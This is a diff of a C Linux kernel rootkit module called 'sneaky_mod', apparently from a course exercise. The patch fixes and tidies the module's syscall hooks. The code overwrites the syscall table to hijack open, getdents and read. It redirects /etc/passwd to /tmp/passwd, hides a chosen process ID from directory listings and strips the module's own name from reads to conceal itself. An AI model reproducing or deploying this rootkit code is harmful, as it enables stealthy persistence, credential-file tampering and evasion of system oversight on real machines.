@@ -9,10 +9,8 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
-#include <linux/types.h>
-
 static int pid;
-module_param(pid, int, 0);
+module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 
 struct linux_dirent {
   u64 d_ino;
@@ -45,23 +43,24 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage int (*original_call_open)(const char *pathname, int flags);
+asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage ssize_t (*original_call_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   // printk(KERN_INFO "Very, very Sneaky!\n");
   if (!strcmp(pathname, "/etc/passwd")) {
-    copy_to_user((void *)pathname, "/tmp/passwd", 12);
+    copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
   }
-  return original_call(pathname, flags);
+  return original_call_open(pathname, flags);
 }
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-  int byteNum = original_getdents(fd, dirp, count);
+  int byteNum = original_call_getdents(fd, dirp, count);
+  if (byteNum <= 0) { return byteNum; }
   int pos = 0;
   char pid_buffer [10];
   snprintf(pid_buffer, 10, "%d", pid);
@@ -83,7 +82,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 //Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   void *pos, *end;
-  ssize_t num = original_read(fd, buf, count);
+  ssize_t num = original_call_read(fd, buf, count);
   if (num <= 0) { return num; }
   pos = strnstr(buf, "sneaky_mod", num);
   if (pos == NULL) { return num; }
@@ -113,12 +112,14 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
+  //open
+  original_call_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
-  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  //getdents
+  original_call_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  // read system call
-  original_read = (void *)*(sys_call_table + __NR_read);
+  //read
+  original_call_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
@@ -147,9 +148,9 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
-  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
   
   //Revert page to read-only
   pages_ro(page_ptr, 1);
